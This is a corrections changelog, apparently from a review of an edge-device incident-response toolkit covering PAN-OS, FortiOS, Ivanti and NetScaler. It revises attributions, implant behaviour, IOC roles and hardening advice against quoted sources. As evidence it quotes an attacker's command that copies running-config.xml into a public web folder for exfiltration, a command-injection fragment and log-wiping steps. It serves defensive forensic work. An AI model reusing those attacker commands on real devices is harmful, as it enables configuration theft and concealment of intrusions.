| EDGE-PACK-0026 references, summary; new ivanti-uta0576-tmp-tooling (B20) | Volexity only; no /tmp detection | Ivanti advisory added with affected versions; welcome.cgi/X-DSCGI-PATH stated as uncovered (needs header logging); path_exists (likely) for the /tmp files Volexity names | Volexity (re-read): "UTA0576 also used a custom LDAPv3 tool and accompanying malicious Python script, writing them to /tmp/ml.py and /tmp/rq5.py"; "Recovered commands explicitly delete /tmp/rq5.py and /tmp/rr.py"; finding: "Check the /tmp/ directory for evidence of post-exploitation actions" (/tmp/mk.py, /tmp/pu.txt, sp_out.txt, spray_hits.json); Ivanti: "25.1.1.1 and prior 25.1.2.2 and prior 22.8R2.4 and prior" |

#### Corrections to facts, attribution and wording

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| EDGE-TA-0001 state_nexus/stated_confidence (A0, A16) | "not stated beyond 'state-backed'"; paraphrased "assessed it is highly likely" | China; both Volexity sentences verbatim; May 2024 post added | Volexity 15 May 2024 (re-read): "Volexity assesses with moderate confidence that UTA0218 is a China-based threat actor"; Volexity 12 Apr 2024: "Volexity assesses that it is highly likely UTA0218 is a state-backed threat actor" |
| EDGE-TA-0001 summary/tradecraft (A2) | "deploying the UPSTYLE backdoor"; running_config.xml | "attempting to deploy ... (unsuccessfully)"; running-config.xml; UPSTYLE log/timestamp behaviour credited to the backdoor, not the actor | Volexity: "UTA0218 attempted to install a custom Python backdoor, which Volexity calls UPSTYLE"; Unit 42: "the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts." |
| EDGE-TA-0001 aliases (A14) | Operation MidnightEclipse as alias | removed; note says it is a Unit 42 operation name neither reporter equates with UTA0218 | Unit 42: "We are tracking the initial exploitation of this vulnerability under the name Operation MidnightEclipse." (no UTA0218 on the page) |
| EDGE-TA-0001 motivation (A15) | espionage | unknown | Neither Volexity post states a motivation; only "state-backed" and "China-based" |
| EDGE-IMP-0001 summary, survives_reboot (A1) | "installed after CVE-2024-3400 exploitation"; survives_reboot yes | attempted, failed per Volexity and Unit 42; survives_reboot unknown; Unit 42 brief added | Volexity: "UTA0218 attempted to download and execute this file via the CVE-2024-3400 but was unsuccessful"; Unit 42: "unsuccessful at installing UPSTYLE after three different exploit attempts." |
| EDGE-IMP-0001 anti_forensics[1] (A9) | "Restores timestamps on the modified CSS file" | restores CSS content after ~15 s and timestamps of both the CSS and sslvpn_ngx_error.log | Volexity: "Fifteen seconds after execution, the original version of bootstrap.min.css is also restored to its previous state. The access and modified timestamps are also restored for both files." |
| EDGE-IMP-0008 summary, survives_upgrade, anti_forensics, gap, references (A19, A20) | survives_upgrade yes; "no process, no log event" | partial; April 2025 releases remove it but FG-IR-25-934 bypasses the fix on 7.2/7.0/6.4; anti-forensics quotes Fortinet; FG-IR-25-934 and researcher post cited; 02-fortinet-fortios/README.md no longer says "produces no log event" | Fortinet blog: "Upgrading to this release will remove the malicious symbolic link."; "This modification took place in the user filesystem and avoided detection."; FG-IR-25-934 (re-read): "FortiOS 7.2 \| 7.2 all versions \| Migrate to a fixed release" |
| EDGE-TA-0006 stated_confidence, references (A26) | only the 2025 Juniper post cited; unhedged wording covered the FortiOS link | Mandiant 2023 Fortinet post added; its hedge quoted for the FortiOS link | Mandiant (saved copy): "Mandiant attributes this activity to UNC3886, a group we suspect has a China-nexus" |
| EDGE-PACK-0024 summary (A39) | "targeting government or government-related organisations" | "highly targeted ... 'with some hints of preferred governmental or government-related targets'" | Fortinet: "The attack is highly targeted, with some hints of preferred governmental or government-related targets." |
| EDGE-IOC-0006 page_url; EDGE-IMP-0009 references (A27) | ncsc.nl advisory URL (now redirects to a news page) | page_url is the publisher's JSCU-NL repository; implant keeps the ncsc.nl URL labelled as redirecting and adds the repository | ncsc.nl URL redirects to "Aanhoudende statelijke cyberspionagecampagne via kwetsbare edge devices"; no archive snapshot verified |
| artifacts/hardening/fortios.yml fortios-sslvpn-off how/sources; response/fortios.yml eradicate[1], do_not[0], vendor_guidance (A6, A7) | "The upgrades that remove the symlink persistence are 7.6.2, 7.4.7, 7.2.11, 7.0.17 and 6.4.16"; response cited no source for the bypass | April 2025 releases remove it, but FG-IR-25-934 bypasses the fix on all 7.2/7.0/6.4: run 7.4.7+ or 7.6.2+; FG-IR-25-934 cited in hardening and vendor_guidance | FG-IR-25-934 (re-read): "may allow a remote unauthenticated attacker to bypass the patch developed for the symbolic link persistency mechanism"; "FortiOS 7.2 \| 7.2 all versions \| Migrate to a fixed release" (same for 7.0, 6.4); KEV CVE-2025-68686 dateAdded 2026-07-27 |
| artifacts/hardening/fortios.yml fortios-sslvpn-off why (A38) | "From FortiOS 7.6.3 SSL VPN tunnel mode is removed and Fortinet advises migrating to IPsec" | sentence removed | Neither cited source (Fortinet April 2025 blog, ASD guidance) mentions 7.6.3 or tunnel-mode removal |
| catalog fortios.yml crash-log artifact (A25) | "persists across reboots" / "kept across reboots" (basis vendor) | retention claim dropped; event log named as Fortinet's primary instruction; suspicious quotes the tech tip | Tech tip documents the command and output only; catalog volatility note already says "no vendor statement confirms either" |
| catalog fortios.yml and profile header: filesystem hash availability (A36) | 7.0.13+, 7.2.6+, 7.4.0+ | documented for 7.2.6 and 7.4.0; earlier builds not confirmed | Cited page is titled "Command to compute file hashes 7.2.6" and links the 7.4.0 entry; nothing on 7.0.13 |
| EDGE-IOC-0011 six ipv4 roles (A18) | actor-controlled, "Attacker address" | unknown, "Address the threat actor was seen using (Fortinet)" | FG-IR-24-535: "Additionally, the TA has been seen using the following IP addresses: 45.55.158.47 [most used IP address] ..." |
| EDGE-IOC-0010 ReverseSocks5 GitHub URL role (A17) | actor-controlled | unknown | Unit 42 lists it as "(ReverseSocks5 Download)" and says "ReverseSocks5 is an open-source networking tool" |
| 02-fortinet-fortios/fortios_cve_2024_55591_jsconsole_admin_login.yml tags (A41) | cve.2025-24472 | tag removed (kept on the pack) | FG-IR-24-535 IoCs are the jsconsole log lines; the pack says "Fortinet publishes no separate indicator for the CSF path" |
| 01-panos-globalprotect/panos_cron_download_exec.yml description (A11) | "crond logs each execution to the system log forwarded off-box" | logs to /var/log/syslog-system.log, carried by the TSF; no source shows it forwarded | Volexity: "This log file is located at /var/log/syslog-system.log and contains various entries related to crond executions" |
| catalog panos.yml bootstrap.min.css artifact (A8) | "restored its timestamp"; suspicious "A different hash or appended text" | original file and timestamps restored ~15 s later; a hash match does not clear the device | Volexity (re-read): "Fifteen seconds after execution, the original version of bootstrap.min.css is also restored to its previous state." |
| catalog panos.yml web-root artifact (A13) | locator portal/js/*; "running_config.xml"; seen_in CVE-2024-0012 | locator global-protect/*.css; running-config.xml; htdocs/unauth labelled watchTowr PoC path for CVE-2024-9474 | Volexity (re-read): "cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/.css"; Unit 42: "cp [snip]/running-config.xml [snip]/global-protect/[16 random characters].css" |
| EDGE-PACK-0001 summary (A33, A34) | "Device telemetry was the original trigger"; "Post-exploitation included the UPSTYLE Python backdoor" | earlier advisory versions listed disabling telemetry as a mitigation; "attempts to install" UPSTYLE (unsuccessful in reported cases); Unit 42 brief added | Advisory: "In earlier versions of this advisory, disabling device telemetry was listed as a secondary mitigation action."; Unit 42: "the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts." |
| catalog panos.yml volatility, profile header, response panos.yml, 01-panos-globalprotect/README.md (A32) | "Logs from the previous install become inaccessible after an upgrade" | "some logs from the prior installation become inaccessible on the device"; support may still help | Advisory: "some logs from the prior system installation will become inaccessible on the device. Please reach out to support if you need help investigating a prior PAN-OS installation." |
| response panos.yml eradicate[1], vendor_guidance (A22) | "A Private Data Reset or full reimage" | EFR through TAC for hardware, new replacement instance for VM-Series/Panorama VA; KB cited | KB kA14u000000CrO6CAK: "This procedure is required for remediation of a compromised or potentially compromised PAN-OS device ... To remediate a VM-Series instance or Panorama Virtual Appliance, you must deploy a new replacement instance." |
| response panos.yml eradicate[0]; profile tac_root_artifacts (A1 sweep) | "UPSTYLE persistence (cron, .pth, web-root files)"; "UPSTYLE used system.pth" | cron is not UPSTYLE; .pth only "where UPSTYLE was installed" | as A1 |
| collectors/profiles/panos.yaml mp_gpsvc references, tac_root_artifacts (A35) | vendor grep cited to Volexity; "Level 3 - interactive access" | advisory added to mp_gpsvc references; Unit 42 quoted verbatim and cited | Advisory: 'grep pattern "failed to unmarshal session(.\+.\/" mp-log gpsvc.log*'; Unit 42: "Level 3: Interactive Access – ... shell-based backdoors, introduction of code, downloading files or running commands." |
| EDGE-PACK-0002 confidence, references, panos-9474-audit-user-injection notes (A28) | confidence high; only watchTowr cited | confidence medium; CVE-2024-0012 advisory added; detection notes mark the audit-log path as unverified toolkit inference (schema has no per-detection confidence field) | Advisory publishes no log indicator; watchTowr shows the payload in the PHP session file and in 'sh -c export panusername=...' |
| EDGE-PACK-0025 summary, panos-0257-poc-host-id title/notes, 01-panos-globalprotect/panos_cve_2026_0257_poc_host_id.yml (A29, A30) | "hard-coded in the public proof of concept"; "attempted exploitation by ransomware operators" | Unit 42's "suspicious host IDs or device names"; exploitation with lateral movement and ransomware deployment; PoC hard-coded endpoint_os_version hunt named as not coded (field layout unpublished) | Unit 42 (saved copy): "using suspicious host IDs or device names, including but not limited to"; "hard-coded client configuration values from the PoC code. endpoint_os_version : Microsoft Windows 10 Pro 64-bit"; "Ransomware operators exploiting CVE-2026-0257 include Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc)." |
| EDGE-PACK-0025 panos-0300-tunnel-tools notes (A31) | "EarthWorm-based tunnellers" | "Tunneling Tools" - Unit 42 does not say which | Unit 42 (saved copy): "/var/tmp/linuxap, /var/tmp/linuxda, /var/tmp/linuxupdate (Tunneling Tools)" |
| EDGE-PACK-0028 summary, references (B6, B7) | "Rapid7 found two organisations compromised"; vendor statement only via researchers | one compromised ADC (14.1); overlap with WHIPSHOT/SLAPSHOT reporting, no actor; CTX697096 added | Rapid7 (re-read): "In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance."; "The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign."; CTX697096: "Exploits of CVE-2026-88771 and CVE-2026-88772 on unmitigated NetScaler deployments have been observed." |
| EDGE-PACK-0027 summary, references (B11, B12) | "PHP outside admin_ui and setuid files under /var are already covered by EDGE-PACK-0004"; script v1.8 | sentence replaced by an explicit list of NCSC-NL checks not carried (whole /var/netscaler PHP/XHTML, root setuid under /var, NSPPE cores, httpd-php extension mapping); NCSC-NL alert added; script title notes VERSION="1.8.3" | NCSC-NL script: "find /var/netscaler/ -type f -name '*.php' -not -path '/var/netscaler/gui/admin_ui/*'"; "find /var \( -perm -4001 -or ... \) -user root"; "find /var/core/ -iname 'NSPPE*'"; NCSC-NL alert: "Zo is de kwetsbaarheid als zero-day misbruikt en zijn er actief sporen gewist" |
| catalog netscaler.yml PHP web-root artifact; netscaler.yaml php_stat purpose (B13) | "Shipped PHP is read-only" (basis vendor) | Fox-IT triage tool expects mode 0444; basis researcher; Fox-IT repo cited | fox-it/citrix-netscaler-triage: "EXPECTED_PHP_FILE_PERMISSION = 0o444" |
| catalog netscaler.yml ns.log artifact, volatility, anti_forensics (B33, B12, B34) | LOGIN_FAILED only; retention "Hours on a busy gateway"; "Trace wiping and log deletion after web-shell installation"; "Backdoors remained on devices that had been patched" | both log forms named, session-reuse via TCPCONNSTAT Client_ip vs Source; retention "days at most (vendor), less on busy gateways"; NCSC's own words for trace erasure; patched-after-planting wording | NetScaler: "the system logs may only be available for a few days prior"; NCSC-NL: "zijn er actief sporen gewist"; Fox-IT: "The high percentage of patched NetScalers that have been backdoored is likely a result of the time at which mass exploitation took place" |
| hardening netscaler.yml netscaler-remote-syslog (B14) | `set audit nslogparams -serverip ...` presented as remote syslog | labelled as the guide's "Local Audit Server Configuration"; remote route per guide is installing the Audit Server on the remote computer; no syslog-action syntax given (none verified) | Guide: "Local Audit Server Configuration Run the following command to configure logging to the local Audit Server in NetScaler: > set audit nslogparams –serverip <hostname> -serverport <port>"; "To configure logging to the Audit Server in a remote computer, install the Audit Server on that computer." |
| hardening netscaler.yml all secure-deployment-guide URLs (B15) | docs.netscaler.com/en-us/.../netscaler-secure-deployment-guide.pdf (404) | https://docs.netscaler.com/us/en/netscaler-adc-secure-deployment/netscaler-adc-secure-deployment.html | Old URL: HTTP 404; current guide linked from that landing page |
| hardening netscaler.yml netscaler-kill-sessions sources[1], how, control (B16, B17) | dead NetScaler CVE-2023-4966 blog; "On every node of an HA pair or cluster" | NCSC-NL alert (lists the five kill commands); each cluster node, or the HA primary | NetScaler 17 Jun 2025: "in case of cluster deployments CSG recommends executing the kill sessions commands on each of the nodes. In case of HA, executing the commands on the Primary active node is sufficient." |
| response netscaler.yml preserve/do_not (B34) | "left backdoors on devices that were already patched" | most backdoored NetScalers were patched after the shell was planted; patching did not remove it | Fox-IT: "approximately 69% of the NetScalers that contain a backdoor are not vulnerable anymore to CVE-2023-3519" |
| 04-citrix-netscaler/php_webshell_generic.yar (B35) | NCC post and fox-it repo cited as if sources of the strings | both rules labelled toolkit heuristics, references marked context only; .receiver/.deb gap stated | NCC/Fox-IT post publishes no YARA or PHP strings; iocitrix.py SUSPICIOUS_PHP_CONTENTS only partly overlaps |
| catalog ivanti-ics.yml web-log artifact; both Ivanti Sigma descriptions; EDGE-IMP-0006 gap; PACK-0007 summary (B2) | "visible as a raw URI where the appliance or an upstream proxy logs it"; "Only the exploitation request is visible in customer-reachable logs" | the appliance's own logs do not record the exploit requests; only an upstream reverse proxy, WAF or TLS-terminating load balancer shows them | Volexity 10 Jan 2024 (re-read): "the web requests associated with the exploits being used in the wild will not appear in the logs, even with the Unauthenticated Request setting enabled. This means that you cannot tell from logs if the server is being exploited." |
| EDGE-TA-0002 aliases, reported_by, summary, stated_confidence, tradecraft, victimology, references, notes (B1, B25, B26) | aliases [UTA0178] "because the reporters themselves equate them"; Volexity fragment 'Chinese nation-state-level threat actor'; "Mandiant later linked BRICKSTORM ... to the same cluster"; 393 days uncited; victimology "government, defence and technology" | alias removed, reported_by Mandiant/GTIG only; note that third parties equate them and the reporters do not; Mandiant 2024 and GTIG 2025 wording verbatim; GTIG BRICKSTORM attribution with its "closely related" hedge and 393-day figure cited; victimology in GTIG's words; Volexity's full sentence in notes; four GTIG/Mandiant posts added | Mandiant Jan 2024 (re-read): "a suspected espionage threat actor, currently being tracked as UNC5221"; "Mandiant had not linked this activity to a previously known group, nor do we currently have enough data to assess the origin"; no UTA0178 on the page; GTIG Apr 2025 (re-read): "UNC5221 is a suspected China-nexus espionage actor"; GTIG BRICKSTORM (re-read): "We attribute this activity to UNC5221 and closely related, suspected China-nexus threat clusters", "for 393 days, on average"; search found no Mandiant or Volexity page equating the clusters |
| EDGE-PACK-0007 summary (B1) | actors [UTA0178, UNC5221] with no comment | summary says both are listed because each reported the exploitation; neither equates them | as B1 |
| EDGE-TA-0005 motivation, first_seen, notes (B18, B19) | motivation financial; first_seen "2026"; notes "No pack yet ... Listed as a gap on purpose" | motivation unknown (schema has no "criminal"; Volexity's words stay in stated_confidence); first_seen 2026-10; notes say EDGE-PACK-0026 covers the on-disk leftovers and what it does not | Volexity: "Volexity assesses with low confidence that UTA0576 has criminal, rather than espionage, motivations"; "In the first week of October 2026" (re-read) |
| response ivanti-ics.yml preserve_first[0], contain[1], do_not[0]; profile header; catalog volatility and memory artifact (B21) | "the 2026 activity was memory-only"; reboot "erases ... the 2026 in-memory patches"; suspicious "A library patched in memory but not on disk" | no persistent implant; tooling in /tmp and /data/.icscap; renamed tcpdump and memory-recoverable files are what a reboot destroys; the patch was restored after each command so a snapshot will usually not contain it | Volexity (re-read): "UTA0576's exploit script restores the in-memory DSCache entry ... and restores the libdsplibs.so library to its pre-exploitation state."; "Volcano also recovers files and file system activity from memory" |
| catalog ivanti-ics.yml anti_forensics, Events artifact (B22) | "manual log-line removal"; "the operator removed entries by hand" | 2026: payload-automated removal from debuglog and audit.log; 2025: exploit script removed entries with sed | Volexity (re-read): "The payload selectively removes recent entries from /home/runtime/dlogs/debuglog and /var/log/audit/audit.log."; GTIG: "Use sed to remove specific log entries from the debug and application logs" |
| catalog ivanti-ics.yml anti_forensics iptables; syslog artifact; profile siem_logs; response preserve_first[1]; hardening ivanti-syslog why (B23, B36) | "UNC5221 hands-on-keyboard (2025)"; "an operator's iptables rule"; SPAWNSLOTH "suppressed logging in-process" | UNC5221 exploit and post-exploitation script for CVE-2025-0282, not SPAWN malware (ports 514 and 6514); SPAWNSLOTH disabled local logging and remote syslog forwarding in dslogserver | GTIG Jan 2025: "the exploit and script generally performs the following steps: 1. Disable SELinux 2. Prevent syslog forwarding 3. Remount the drive as read-write"; GTIG Apr 2025 (re-read): "It targets the dslogserver process to disable both local logging and remote syslog forwarding." |
| catalog ivanti-ics.yml external ICT; profile ict_external (B5) | "Encrypted snapshot decrypted by the vendor"; "send it to Ivanti for decryption" | current external ICT gives an unencrypted snapshot when files are found; reboot claim kept (Volexity); Ivanti blog cited | Ivanti (29 Feb 2024): "The enhanced external ICT will no longer require support to decrypt a customer's snapshots ... will now provide customers with an unencrypted snapshot for their own review." |
| catalog ivanti-ics.yml internal ICT collection and artifact; profile ict_internal_history (B24, partly) | CISA only; no event IDs | KB44859 cited; SYS32087/32088/32100/32039/32040 recorded | KB44859: "detects new or modified system files and logs them in the Scan UI and Event Logs"; "SYS32039 - Integrity Checker Failed: Detection 1 new files!" |
| EDGE-IMP-0005 references, summary, artifacts, anti_forensics, gap (B4, B37) | CISA AA24-060B (no SPAWN mention) and The Record; "suppresses logging in-process"; "operator's own commands"; cves silent on 2024 | GTIG Jan 2025, GTIG Apr 2025 and Cutting Edge Part 4 cited; SPAWNSLOTH quoted; exploit-script attribution; 2024 first reporting and the UNC5337 statement noted | GTIG Apr 2025 (re-read): "the previously reported SPAWN ecosystem of malware attributed to UNC5221"; GTIG Jan 2025: "Mandiant previously attributed the SPAWN ecosystem of malware ... to UNC5337"; AA24-060B: 0 hits for SPAWN |
| EDGE-IMP-0006 summary, anti_forensics, references (B30) | "Found by comparing files against known-good copies" | memory/disk forensics plus ICT results; scanner.py modification (Volexity 18 Jan); Mandiant THINSPOOL sentence; Volexity 10 Jan and Mandiant 11 Jan added | Volexity 10 Jan 2024: "Volexity used a combination of memory and disk forensics, combined with the results of the Integrity Checker Tool"; Mandiant: "THINSPOOL attempts to evade Ivanti's Integrity Checker but Mandiant observed this attempt failed." |
| EDGE-IOC-0002 206.189.208.156 and 75.145.243.85; EDGE-IOC-0003 108.165.147.64 roles (B27) | actor-controlled | unknown (publisher context kept) | Volexity CSV: "DigitalOcean IP address tied to UTA0178."; "UTA0178 IP address observed interacting with compromised device"; IOC-0003 "UTA0576 exploitation IP" (blog: "an Evoxt VPS") |
| response ivanti-ics.yml eradicate[0], do_not[2] (B31) | "CISA reported root-level persistence surviving factory reset" | CISA lab finding, Ivanti disputes in-the-wild feasibility; Ivanti recommends a new build over factory reset for virtual appliances | CISA: "a cyber threat actor may be able to gain root-level persistence despite issuing factory resets"; Ivanti: "this lab-based finding has not been observed by CISA, Ivanti or Mandiant in the wild"; "factory resets of virtual appliances have not been consistently successful" |
| hardening ivanti-ics.yml ivanti-mgmt-interface how; ivanti-admin-realm-ip-mfa why (B32) | "The configuration path for ICS was not confirmed"; "makes both mandatory" | vendor's own navigation paths quoted; MFA required, source-IP restriction "should be considered" | Ivanti page: "Administrators > Admin Realms > Admin Users > Authentication Policy > Administrator sign in ports"; "Administrator > Admin Realms > Select Realm > Authentication Policy > Source IP"; "MFA (Multifactor Authentication) must be enabled for all external and internal admin access." |
| EDGE-HUNT-0010 sources[1], inferred (F0) | quote "If 303013 and 302014 are absent, it is an indicator ..." (read: summariser); inferred "CISA's '303013' is read as a typo" | verbatim current sentence, read: direct, www.cisa.gov URL; typo inference deleted | CISA ED 25-03 supplemental (main session re-read; updated April 24, 2026): "If 302013 and 302014 are absent when expecting VPN activity, treat this as suspicious and investigate for potential threat actor malware." |
| EDGE-HUNT-0011 sources[1] (F1) | "all logins through the compromised device should be heavily scrutinized" (summariser) | "scrutinize all logins traversing the compromised device." read: direct | CISA (main session re-read): "scrutinize all logins traversing the compromised device." |
| EDGE-HUNT-0012 sources, seen_in (F2, F3) | read: summariser; seen_in "ArcaneDoor 2025 (CISA)" with no source naming ArcaneDoor | read: direct; seen_in "Cisco ASA/FTD campaign 2025-26 (CISA ED 25-03; Cisco attributes it to the ArcaneDoor actor)"; Cisco detection guide added as the source tying the campaign to the actor | CISA: "Look for widespread scans of printers, largely across TCP port 443"; "CISA is aware of an ongoing campaign by a sophisticated threat actor"; Cisco: "According to the update, the ArcaneDoor threat actor has developed a previously unknown persistence mechanism" |
| EDGE-HUNT-0022 sources, seen_in (F4, F6, F7) | Unit 42 probing quote (unattributed section) backing EDGE-TA-0001; no source naming UNC3886; ASD quote read: summariser and old URL | Volexity's UTA0218 cron/wget sentence replaces the unattributed Unit 42 quote; Mandiant Juniper post added for EDGE-TA-0006; ASD read: direct at the canonical URL | Unit 42: "We have not seen any relationships between these indicators and those associated with Operation MidnightEclipse." (saved copy); Volexity (re-read): "Volexity focused on crond executions the threat actor triggered due to use of a cron.d script for persistence and downloading of additional payloads via wget."; Mandiant: "active backdoor that communicates to the following hardcoded command and control (C2) servers"; ASD: "network traffic directed at hosts that the edge device doesn’t normally communicate with." |
| EDGE-HUNT-0023 actors basis, sources, seen_in, inferred (F8) | only source was Unit 42's unattributed exploit-attempt sentence, used to back EDGE-TA-0001 | Volexity's UTA0218 cp command is the actor basis; Unit 42 MidnightEclipse sentence added for the HTTP fetch; the unattributed sentence kept and labelled; inferred states the random .css naming comes from unattributed attempts | Unit 42 (saved copy, confirmed by main session): "The commands included copying configuration files to the web application folder and exfiltrating them via HTTP requests to those files."; the "third command" sentence sits under "Additional Exploitation Observations" with "We have not seen any relationships between these indicators and those associated with Operation MidnightEclipse."; Volexity (re-read): "cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/" |
| EDGE-HUNT-0025 sources[0] (F5) | read: summariser; old ASD URL | read: direct; canonical URL; confidence stays low/unverified (single source) | ASD: "this account should alert if it accesses any hosts other than the one it is specifically configured to communicate with." |
| EDGE-HUNT-0021 method[1], sources[1].url (F9, F10) | "Clear all logs"; Arctic Wolf short URL | "Clear all logs manually"; canonical og:url | GTIG: "Log entries for `Current settings exported`, `Current settings imported`, or `Clear all logs manually`" |
| EDGE-HUNT-0004 inferred (F11) | ASA capture commands in AAA/syslog presented without caveat | inferred note: LINE DANCER captures may never reach AAA accounting or syslog; absence is not evidence | Talos: Line Dancer is "a memory-resident shellcode interpreter"; uses include "Create and exfiltrate packet captures" |
| hardening baseline.yml base-phishing-resistant-mfa how/sources (F12) | "ASD sets a floor of a passphrase of at least four random words and 15 characters" | ASD's own wording: follow local authority length/complexity advice, strongest the system supports; ASD quote added | ASD: "If phishing-resistant MFA is not supported by a device, single-factor authentication should be achieved using the latest password complexity and length advice from local cybersecurity authorities." |
| hardening baseline.yml base-logs-offbox blunts (F13) | [LINE DANCER, UNC3886, OVERSTEP, UPSTYLE] | blunts removed (names stay in why) | None of the cited sources names them |
| hardening baseline.yml base-no-eol blunts/sources (F14) | [RayInitiator, UNC3886] with no source naming either | blunts [UNC3886] with the Mandiant Juniper source; GTIG CVE-2025-22457 source added for the Ivanti 9.x claim; RayInitiator dropped | Mandiant: "the affected Juniper MX routers were running end-of-life hardware and software"; GTIG: "active exploitation in the wild against ICS 9.X (end of life)" |
| hardening baseline.yml NSA sources (F15) | aha.org mirror of PP-22-0266; "the .gov PDF refused automated access" | media.defense.gov v1.2 (PP-22-0293) with quote | NSA guide v1.2: "NSA recommends establishing at least two remote, centralized log servers" |
| hardening baseline.yml BOD 23-02 implementation guidance and ASD URLs (F16) | redirecting URLs | canonical URLs | Both redirect; quotes confirmed on the canonical pages |
| hardening baseline.yml base-patch-check-first sources (F17) | claims about NetScaler and FortiGate with no source saying them | Fox-IT and Fortinet posts added with quotes | Fox-IT: "Of the backdoored NetScalers, 1248 are patched for CVE-2023-3519"; Fortinet: "this symbolic link may have been left behind" |
| hardening baseline.yml base-separate-pep, base-segregate-from-ad, base-default-creds, base-procure-forensics confidence (F18) | high, one source each | medium; CCCS added to base-default-creds | CLAUDE.md provenance rule; CCCS: "Credentials must be changed from their default settings" |
| EDGE-TA-0007 summary, platforms (F19) | "AA25-239A lists CVE-2023-20198, CVE-2023-20273 and CVE-2018-0171" | lists all five example CVEs incl. CVE-2024-21887 (chained after CVE-2023-46805) and CVE-2024-3400; platforms add EDGE-0003 and EDGE-0001 | AA25-239A: "Example exploited CVEs, ordered by year, include: CVE-2024-21887 ... CVE-2024-3400 ... CVE-2023-20273 ... CVE-2023-20198 ... CVE-2018-0171" |
| EDGE-TA-0007 reported_by, summary, tradecraft (F20) | Cisco Talos in reported_by; Talos findings folded in unlabelled | Talos out of reported_by; Talos items labelled "Salt Typhoon (Talos) - partial overlap per AA25-239A" | AA25-239A: "This activity partially overlaps with cyber threat actor reporting ... commonly referred to as Salt Typhoon"; Talos does not mention AA25-239A |
| EDGE-TA-0007 references, notes (F21) | IC3 copy "read because cisa.gov refused automated access" | wording dropped; v1.1 revision note; STIX bundle URL added as a reference; no IOC set created (follow-up) | cisa.gov AA25-239A loads; "3 September 2025, v1.1: ... one IP correction and two removals."; bundle redirects to the 2025-09 path (main session) |
| docs/edge-dfir-investigation-guide.md "What is different" bullet 2 (F22) | "Memory-only implants (LINE DANCER on ASA, in-memory library patching on Ivanti in 2026)" | LINE DANCER as a memory-only implant; UTA0576's transient libdsplibs.so patch as memory-only exploitation that leaves no implant | Volexity: "restores the libdsplibs.so library to its pre-exploitation state" |
| docs/edge-dfir-investigation-guide.md ASA platform note, "Before you touch the device" (F23) | "follow the CISA ED 25-03 procedure" | the April 24, 2026 supplemental direction has three device-specific procedures and adds FIRESTARTER; new item 5 quotes the tab-autocomplete warning; RayDetect sentence left (not verified in this pass) | CISA (saved copy): "It is imperative that organizations follow the correct guidance for each device category, as instructions and commands vary."; "Do NOT use the “tab” autocomplete or any other autocomplete function. The threat actor has hooked these commands to crash the device." |
| docs/edge-dfir-investigation-guide.md PAN-OS and NetScaler bullets (A32, B34 sweep) | "logs from the previous install become inaccessible"; "had already been patched" | "some logs from the prior installation"; "patched after the web shell was planted" | as A32, B34 |

#### Earlier corrections reversed

The main session should rewrite these VERIFICATION.md rows (not edited here).

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| VERIFICATION.md line 31: UTA0576 motivation | espionage -> financial ("Volexity's own words quoted") | unknown; Volexity's words stay in stated_confidence (the schema has no "criminal" value) | Volexity: "low confidence that UTA0576 has criminal, rather than espionage, motivations" - "financial" does not appear |
| VERIFICATION.md line 32: Ivanti syslog blocking | "iptables DROP rules and the read-write remount were the operator's commands" | steps of UNC5221's exploit and post-exploitation script for CVE-2025-0282 (still not SPAWN); SPAWNSLOTH disables local logging and remote syslog forwarding in dslogserver. CLAUDE.md's "the operator's iptables command" rule needs the same rewrite | GTIG Jan 2025: "the exploit and script generally performs the following steps: 1. Disable SELinux 2. Prevent syslog forwarding 3. Remount the drive as read-write"; GTIG Apr 2025: "It targets the dslogserver process to disable both local logging and remote syslog forwarding." |
| VERIFICATION.md line 37: CVE-2024-3400 trigger | "telemetry was the original trigger" | earlier advisory versions listed disabling telemetry as a mitigation; the advisory never calls telemetry the trigger | Advisory: "In earlier versions of this advisory, disabling device telemetry was listed as a secondary mitigation action." |
| VERIFICATION.md line 43: FortiOS filesystem hash | "7.0.13+, 7.2.6+ and 7.4.0+" | documented for 7.2.6 and 7.4.0; earlier builds not confirmed | Cited page is titled "Command to compute file hashes 7.2.6" and links the 7.4.0 entry; no 7.0.13 source |
| VERIFICATION.md line 76: CISA ED 25-03 | "cisa.gov refused automated fetches; content confirmed through mirrors and press" | read directly (updated April 24, 2026); hunts 0010-0012 quote it verbatim with read: direct | Main-session re-read of the live page |
| VERIFICATION.md line 271: "303013" | read as a typo for 302013 | CISA now prints 302013; the inference is deleted from EDGE-HUNT-0010 | "If 302013 and 302014 are absent when expecting VPN activity ..." |
| VERIFICATION.md lines 241-242: NSA guidance via mirror | aha.org mirror; ".gov PDF refused automated access" | media.defense.gov v1.2 (PP-22-0293) is the source | Primary PDF loads: "NSA recommends establishing at least two remote, centralized log servers" |
| Earlier wording that UTA0178 is an alias of UNC5221 (EDGE-TA-0002: "the reporters themselves equate them") | alias | removed; third parties equate them, Mandiant and Volexity do not | Mandiant Jan 2024: "Mandiant had not linked this activity to a previously known group" |
| Earlier wording that EDGE-PACK-0028's pitboss pattern covered both forms | pattern with \s? inside the heartbeats branch | \s? moved outside the alternation; Rapid7 form now matches | Tested: the old regex returned False on "pitboss PPE unexpectedly died NSPPE;..." |

#### Rejected (not applied) and why

No issue was rejected for missing evidence: every HIGH item was re-read (Volexity 15 May 2024 and 12 Apr 2024, Fortinet tech tip, FG-IR-25-934, pgj11.com, Mandiant Jan 2024, Volexity 10 Jan 2024, saved MIVD/AIVD advisory text, saved Unit 42 brief) or was in the main session's confirmed list, and each passage was found. Partial or declined parts:

| Item | Reason |
|---|---|
| A37 fortios.yml collection[fnsysctl ls / cat] confidence medium -> high | Not applied (the super_admin note was applied). APPLY.md rule 3: a vendor-documented command nobody ran on a device is at most medium unless the vendor shows its output; the tech tip shows paths, not output. |
| A29 (part) add the nine pre-PoC source IPs as an IOC set; add the PoC hard-coded endpoint_os_version hunt | Not applied: the source IPs need a parsed IOC set (out of scope for an apply pass); the PoC values are recorded as not coded because the exported GlobalProtect field layout is not published. |
